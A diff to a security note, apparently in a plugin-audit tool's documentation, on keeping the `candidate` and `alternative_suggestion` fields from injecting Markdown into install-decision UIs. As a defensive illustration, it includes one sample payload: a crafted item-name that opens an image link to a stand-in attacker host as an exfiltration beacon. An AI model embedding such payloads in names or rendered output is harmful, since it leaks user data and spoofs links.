@@ -234,8 +234,8 @@ excerpt containment; this note does not cover it.
 **Excerpt containment for `candidate`/`alternative_suggestion` (every
 verdict).** These two fields carry the same unconstrained
 `<owner>/<repo>@<item-name>` shape as `feedback/SKILL.md`'s own "Identifier
-containment" note: `candidate` is echoed verbatim from the `## Input`
-dispatch value (line 159 above), and `alternative_suggestion` is populated
+containment" note: `candidate` is echoed verbatim from the `## Input (from
+dispatch prompt)` value above, and `alternative_suggestion` is populated
 from the equally-unconstrained `alternatives` input list. Neither is
 charset-restricted by anything upstream — `discover.mjs`'s own candidate
 filter only checks `typeof c.id === "string" && typeof c.name === "string"`
@@ -245,9 +245,9 @@ gates the install write, not this audit). Unlike `report_template.body`
 above, `candidate` and `alternative_suggestion` are present on EVERY
 verdict (GREEN/YELLOW/RED alike), so this note is not RED-scoped. This
 schema is expected to be rendered as Markdown by callers — e.g.
-`/ievo:init` Step 8a's summary tables and `AskUserQuestion` interview, or
-`/ievo:update`'s re-audit prompt — the same expectation `report_template.body`
-documents above, so a crafted item-name (e.g. `` evil](https://attacker.example/beacon.png?ignore= ``)
+`/ievo:init` Step 8a's summary tables and `AskUserQuestion` interview — the
+same expectation `report_template.body` documents above, so a crafted
+item-name (e.g. `` evil](https://attacker.example/beacon.png?ignore= ``)
 could smuggle a live-rendering exfiltration beacon or a spoofed link into an
 install-decision UI. Any caller rendering `candidate` or
 `alternative_suggestion` must wrap it in an inline code span first, using
